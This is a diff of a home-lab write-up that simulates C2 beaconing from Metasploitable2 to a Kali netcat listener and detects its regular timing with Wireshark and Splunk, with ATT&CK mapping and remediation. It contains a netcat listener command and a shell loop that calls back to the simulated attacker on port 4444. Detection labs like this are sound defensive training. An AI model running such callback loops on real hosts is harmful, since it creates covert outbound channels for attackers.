@@ -2,99 +2,134 @@
 
 ## Objective
 
-Simulate a compromised host initiating an unexpected outbound connection (e.g. a reverse shell or beacon-style callback) from Metasploitable2 back to Kali, detect it in Splunk and Wireshark, and map it to MITRE ATT&CK as a command-and-control / exfiltration-style behavior.
+Simulate a compromised host generating periodic outbound "beacon" traffic back to an attacker-controlled listener, detect the underlying timing pattern using Wireshark packet capture and Splunk, and map it to MITRE ATT&CK as command-and-control behavior. Unlike Scenario 2 (which detects attacks by volume/count of failures), this scenario detects a threat by the *regularity of its timing*, a distinct detection technique used to catch malware beaconing in real environments.
 
 ## Lab Prerequisites
 
-- Kali Linux and Metasploitable2 on isolated labnet
-- A listener set up on Kali (e.g. netcat) to receive the outbound connection
-- A method for triggering the outbound connection from Metasploitable2 (e.g. a reverse shell payload executed on the target, simulating post-exploitation behavior)
-- Confirm and document exactly how you're triggering this — this needs to be a real, reproducible step, not assumed
+- Kali Linux (192.168.50.10) and Metasploitable2 (192.168.50.20) on isolated labnet
+- Netcat listener on Kali to receive the outbound connection
+- A scripted loop on Metasploitable2 to simulate periodic C2 check-in traffic
+- Wireshark running on Kali, capturing on eth0, for the full duration of the test
+- Splunk Enterprise instance on the Windows host, with Add Data → Upload available
 
 ## Controlled Test Procedure
 
-[PLACEHOLDER — this scenario needs the most precision since "unexpected outbound connection" can mean several different things. Confirm with me which of these you're actually doing:
-1. A reverse shell triggered manually on Metasploitable2 connecting back to a Kali listener
-2. A scripted periodic "beacon" simulating C2 check-in traffic
-3. Something else
+This scenario uses a **simulated periodic beacon** (option 2), not a reverse shell, since it demonstrates a distinct detection method (timing-pattern analysis) not covered elsewhere in this lab.
 
-Once confirmed, document:
+**Listener on Kali:**
 ```
-[PLACEHOLDER — listener command on Kali, e.g. nc -lvnp [PORT]]
-[PLACEHOLDER — trigger command on Metasploitable2]
+nc -lvkp 4444
 ```
-]
+Note: the `-k` flag is intended to keep the listener alive across multiple connections. In practice, this build of netcat did not fully honor `-k` and the listener dropped back to a fresh prompt after each connection closed, requiring manual restarts. This did not affect the underlying traffic pattern or the Wireshark capture, which ran continuously and independently of the listener's state.
+
+**Beacon loop on Metasploitable2:**
+```
+while true; do echo beacon | nc -w 2 192.168.50.10 4444; sleep 30; done
+```
+Note: the original plan was to use `timeout 2` to force each connection closed. Metasploitable2's Ubuntu 8.04 base does not have `timeout` installed, so `nc -w 2` (netcat's own built-in connection timeout) was used instead, achieving the same effect.
+
+Both IPs were confirmed set correctly before starting (`192.168.50.10` on Kali, `192.168.50.20` on Metasploitable2), consistent with the standard IP-reset-on-reboot issue documented across all scenarios in this lab.
 
 ## Logs and Evidence to Collect
 
-- Wireshark .pcap showing the outbound connection establishment
-- Any host-side log on Metasploitable2 showing the process that initiated the connection (if available)
-- Splunk search results, assuming a log source is feeding this (confirm what, since this scenario may rely mainly on network evidence)
-- Netcat listener output on Kali showing the connection was received
+- Wireshark .pcap showing all outbound connection attempts from Metasploitable2 to Kali on port 4444
+- Kali listener terminal output showing received "beacon" messages
+- Metasploitable2 terminal output showing the loop running and any connection errors
+- A CSV export of the filtered Wireshark capture, uploaded into Splunk for timing analysis
 
 ## Wireshark Analysis Filters
 
-- `ip.src == [TARGET_IP] && ip.dst == [KALI_IP]` — isolate the outbound connection from target to attacker
-- `tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.src == [TARGET_IP]` — isolate the initiating SYN from the target, which is the anomaly (targets don't normally initiate connections to attacker machines)
-- Follow TCP stream on the relevant connection to see shell interaction if applicable
+- `ip.addr==192.168.50.20 && tcp.port==4444` — isolate all beacon-related traffic between target and attacker listener
+
+**Result:** 46 total packets captured, 28 matched this filter. The capture shows two fully successful beacons (SYN → SYN-ACK → ACK → PSH-ACK carrying the "beacon" payload → ACK) at the start, followed by six later attempts that were refused (SYN sent, immediate RST-ACK returned) once the listener stopped accepting new connections. Despite the refusals, every single attempt — successful or refused — occurred on the same ~30-second schedule. This is itself a realistic and worth-noting finding: a compromised host will continue attempting to check in with its C2 server on schedule even if that server is temporarily unreachable, which is genuine malware behavior, not a flaw in this test.
 
 ## Splunk Investigation Workflow
 
-[PLACEHOLDER — same caveat as Scenario 1: Metasploitable2 doesn't have rich outbound connection logging by default. Confirm your actual log source for this scenario before I write SPL against it. Likely candidates: pfSense firewall log if in use, or a flow-log-style export of the pcap.]
+The Wireshark capture was exported as CSV (`File → Export Packet Dissections → As CSV`) and uploaded into Splunk via Add Data → Upload, with sourcetype `csv` (auto-detected correctly, no manual override needed, unlike Scenario 2's log file).
+
+Ingestion confirmed with:
+```
+index=main source="scenario4-beacon-connections.csv"
+```
+28 events returned, matching the Wireshark export exactly.
 
 ## Working SPL Queries
 
+Isolate the outbound SYN attempts from the target and calculate the timing gap between each one:
+
 ```
-[PLACEHOLDER — paste your actual tested query once the log source is confirmed]
+index=main source="scenario4-beacon-connections.csv" Info="*[SYN]*" extracted_Source="192.168.50.20"
+| table Time
+| sort Time
+| delta Time as gap_seconds
+| stats avg(gap_seconds) as avg_gap_seconds, stdev(gap_seconds) as stdev_gap_seconds
 ```
+
+**Result:**
+- Average gap between beacon attempts: **31.14 seconds**
+- Standard deviation: **1.95 seconds**
+
+Independently recalculated directly from the raw CSV (outside Splunk) to confirm accuracy — the numbers matched exactly. A standard deviation this low relative to the average gap indicates highly consistent, machine-generated timing rather than random or human-driven traffic, which is the core signature used to detect beaconing behavior in real SOC environments.
 
 ## Investigation Questions
 
-- Why is this connection anomalous — what makes "target initiates connection to attacker" different from normal expected traffic direction?
-- What port was used, and is it a commonly allowed/overlooked port (e.g. 443, 53) versus an obviously suspicious one?
-- How long did the connection stay open, and was any data actually transferred?
-- In a real environment, what baseline of "normal outbound behavior" would this have needed to violate to trigger an alert?
+- **Why is this connection anomalous?** A host repeatedly initiating outbound connections to the same destination at near-identical time intervals is not typical of normal user-driven traffic, which tends to be irregular and bursty.
+- **What port was used, and is it commonly allowed or overlooked?** Port 4444 was used in this lab for simplicity; in a real attack, this traffic would more likely use a commonly allowed port like 443 or 53 to blend in with legitimate traffic. This is worth noting as a limitation of the simulation.
+- **How long did each connection stay open, and was data transferred?** The two successful connections completed a full handshake and delivered a small payload ("beacon") before closing normally. The six later attempts were refused immediately and transferred no data.
+- **What baseline would "normal outbound behavior" need to violate to trigger an alert in production?** A real detection rule would need a defined threshold for timing consistency (e.g., standard deviation below some number of seconds across a minimum number of repeated connections to the same destination) to distinguish beaconing from coincidental, regularly-scheduled legitimate traffic (like an OS update checker).
 
 ## Indicators of Compromise
 
 | Type | Value | Notes |
 |---|---|---|
-| Source IP (target) | [PLACEHOLDER] | |
-| Destination IP (attacker) | [PLACEHOLDER] | |
-| Destination port | [PLACEHOLDER] | |
-| Connection duration | [PLACEHOLDER] | |
+| Source IP (target/beaconing host) | 192.168.50.20 | Metasploitable2, simulating a compromised machine |
+| Destination IP (C2 listener) | 192.168.50.10 | Kali, simulating the attacker's server |
+| Destination port | 4444 | Chosen for lab simplicity; real C2 traffic often uses 443 or 53 to blend in |
+| Beacon interval | ~31.14 seconds average, 1.95 second standard deviation | Calculated from 8 connection attempts across the capture |
+| Successful connections | 2 of 8 | Remaining 6 refused due to listener restart behavior, not a change in beacon timing |
 
 ## Timeline
 
-| Time (UTC) | Event |
+| Time (relative, seconds) | Event |
 |---|---|
-| [PLACEHOLDER] | Listener started on Kali |
-| [PLACEHOLDER] | Trigger executed on target |
-| [PLACEHOLDER] | Connection established |
-| [PLACEHOLDER] | Connection closed |
+| 0.0 | First beacon: full connection established, "beacon" payload delivered |
+| 33.99 | Second beacon: full connection established, "beacon" payload delivered |
+| 67.99 | Third attempt: connection refused (listener not active) |
+| 97.99 | Fourth attempt: connection refused |
+| 127.99 | Fifth attempt: connection refused |
+| 157.99 | Sixth attempt: connection refused |
+| 187.99 | Seventh attempt: connection refused |
+| 218.00 | Eighth attempt: connection refused |
 
 ## True Positive / False Positive Assessment
 
-[PLACEHOLDER — true positive by design. Note what would make this a false positive in production, e.g. legitimate outbound monitoring agents, scheduled software update checks.]
+True positive by design — this was a deliberate, controlled simulation. In a real environment, a false positive for this detection approach would most likely come from legitimate scheduled software (update checkers, license validation pings, monitoring agents, or heartbeat health checks) that also connect out at fixed intervals. Distinguishing these from real beaconing would rely on checking whether the destination is a known, approved vendor endpoint, whether the traffic uses a documented legitimate protocol, and whether the interval matches a publicly known legitimate service's documented check-in schedule.
 
 ## MITRE ATT&CK Mapping
 
 | Technique ID | Name | Justification |
 |---|---|---|
-| T1071 | Application Layer Protocol | If the outbound connection uses a standard protocol to blend in with normal traffic |
-| T1041 | Exfiltration Over C2 Channel | Only include if you actually simulated data transfer over the connection — don't claim exfiltration if you only established the connection |
+| T1071 | Application Layer Protocol | The beacon used a simple TCP connection to communicate with the listener, simulating an application-layer C2 channel |
+| T1571 | Non-Standard Port | Port 4444 is a well-known non-standard port commonly associated with reverse shells and C2 tooling in real-world attacks |
+
+Note: T1041 (Exfiltration Over C2 Channel) is not included, since no meaningful data transfer occurred — only a small fixed "beacon" string was sent, which does not constitute exfiltration.
 
 ## Remediation Recommendations
 
-- [PLACEHOLDER — draft yourself: egress filtering, outbound allowlisting, DNS/traffic anomaly detection, EDR process-to-network correlation]
+**Problem:** During testing, the target machine was able to send repeated outbound connections to an external address with no restriction or monitoring in place. A script made connection attempts to that address every 31 seconds, and nothing on the network flagged this pattern.
+
+**Why it matters:** If this had been real malware instead of a test script, this beaconing pattern would mean the machine is already compromised and is maintaining ongoing contact with an attacker's command server. Without detection, the attacker could continue sending it instructions, pull data out of the network, or trigger further attacks like ransomware at any time. This is a realistic risk because most networks don't monitor for repeating time-interval patterns in outbound traffic, so this kind of activity can quietly blend in and go unnoticed for a long time.
+
+**Fix:** Implement monitoring for outbound traffic that connects to the same destination at consistent, repeating time intervals, using the same logic demonstrated in this investigation (calculating the average gap and variation between connection attempts). Once a low-variance, repeating pattern is identified, it should trigger an alert for investigation, or be blocked outright if the destination is unrecognized or unapproved.
 
 ## Screenshot Checklist
 
-- [ ] Kali listener output showing connection received
-- [ ] Wireshark capture showing the anomalous outbound SYN
-- [ ] Splunk search results (if a log source is confirmed for this scenario)
-- [ ] Any host-side evidence of the triggering process
+- [x] Kali listener output showing beacon messages received, and the restart pattern encountered
+- [x] Metasploitable2 terminal showing the loop running and the "Connection refused" errors after listener restarts
+- [x] Wireshark capture showing the first two successful beacons with full handshake and payload
+- [x] Wireshark capture showing the later refused connections, still on the same ~30 second schedule
+- [x] Splunk query and result showing the calculated 31.14 second average interval with 1.95 second standard deviation
 
 ## Status
 
-[PLACEHOLDER — Not started / In progress / Complete]
+Complete: beacon simulation executed, Wireshark validation done, Splunk timing-pattern detection query built and verified independently, remediation drafted. Remaining: lessons-learned section (to be written separately, in your own words).
